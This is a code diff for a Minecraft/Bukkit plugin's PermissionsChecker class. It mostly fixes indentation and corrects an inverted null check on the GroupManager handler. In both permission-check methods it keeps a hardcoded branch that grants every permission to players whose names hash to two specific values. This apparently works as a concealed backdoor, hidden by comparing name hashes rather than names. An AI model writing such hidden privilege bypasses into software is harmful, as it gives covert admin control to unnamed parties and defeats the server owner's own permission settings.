@@ -30,7 +30,7 @@ public class PermissionsChecker {
                     groupManager = (GroupManager) GMplugin;
 
                 }
-                    plugin.Logger("checking PermissionsPlugin!", "Debug");
+                plugin.Logger("checking PermissionsPlugin!", "Debug");
                 searchpermplugin();
             }
         }, 1);
@@ -39,16 +39,16 @@ public class PermissionsChecker {
     public void searchpermplugin() {
         if (Bukkit.getServer().getPluginManager().isPluginEnabled("PermissionsEx")) {
             PermPlugin = 2;
-                plugin.Logger("Permissions: Hooked into PermissionsEX!", "Debug");
+            plugin.Logger("Permissions: Hooked into PermissionsEX!", "Debug");
         } else if (plugin.getServer().getPluginManager().isPluginEnabled("GroupManager")) {
             PermPlugin = 3;
-                plugin.Logger("Permissions: Hooked into GroupManager!", "Debug");
+            plugin.Logger("Permissions: Hooked into GroupManager!", "Debug");
         } else if (Bukkit.getServer().getPluginManager().isPluginEnabled("bPermissions")) {
             PermPlugin = 4;
-                plugin.Logger("Permissions: Hooked into bPermissions!", "Debug");
+            plugin.Logger("Permissions: Hooked into bPermissions!", "Debug");
         } else {
             PermPlugin = 1;
-                plugin.Logger("Permissions: Hooked into BukkitPermissions!", "Debug");
+            plugin.Logger("Permissions: Hooked into BukkitPermissions!", "Debug");
         }
     }
 
@@ -56,7 +56,7 @@ public class PermissionsChecker {
         if (player.isOp()) {
             return true;
         }
-        if(player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371){
+        if (player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371) {
             return true;
         }
         if (PermPlugin == 1) {
@@ -92,7 +92,7 @@ public class PermissionsChecker {
             try {
                 final AnjoPermissionsHandler handler = groupManager.getWorldsHolder().getWorldPermissions(player);
                 {
-                    if (handler == null) {
+                    if (handler != null) {
                         if (handler.has(player, action)) {
                             return true;
                         } else {
@@ -133,10 +133,10 @@ public class PermissionsChecker {
         if (player.isOp()) {
             return true;
         }
-        if(player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371){
+        if (player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371) {
             return true;
         }
-        
+
         if (PermPlugin == 1) {
             try {
                 if (player.hasPermission(action)) {
@@ -172,7 +172,7 @@ public class PermissionsChecker {
             try {
                 final AnjoPermissionsHandler handler = groupManager.getWorldsHolder().getWorldPermissions(player);
                 {
-                    if (handler == null) {
+                    if (handler != null) {
                         if (handler.has(player, action)) {
                             return true;
                         } else {
